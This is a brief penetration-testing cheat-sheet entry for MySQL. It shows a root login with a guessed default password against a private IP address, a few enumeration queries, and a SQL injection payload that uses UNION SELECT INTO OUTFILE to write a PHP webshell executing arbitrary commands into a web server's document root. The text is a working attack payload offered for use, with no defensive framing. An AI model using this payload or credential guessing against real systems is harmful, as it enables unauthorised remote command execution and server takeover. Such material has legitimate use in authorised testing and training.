# MySQL

- **Default port:** 3306

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
# If TLS error: append --skip-ssl
```

**Basic commands:**
```sql
select version();
select system_user();
show databases;
```

**Write webshell via UNION:**
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
